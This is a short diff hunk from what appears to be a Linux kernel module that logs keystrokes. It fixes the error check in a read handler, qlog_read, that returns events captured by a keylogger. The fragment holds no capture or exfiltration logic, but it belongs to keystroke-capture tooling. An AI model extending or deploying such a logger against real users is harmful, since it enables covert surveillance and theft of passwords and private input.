@@ -173,7 +173,7 @@ static ssize_t qlog_read(struct file* file, char* buf, size_t len, loff_t* off) 
     }
 
     // Read from the keylogger
-    if (keylogger_last_events(kbuf, len) != 0) {
+    if (keylogger_last_events(kbuf, len) < 0) {
         // Be sure to clean up.
         kfree(kbuf);
         return -EFAULT;
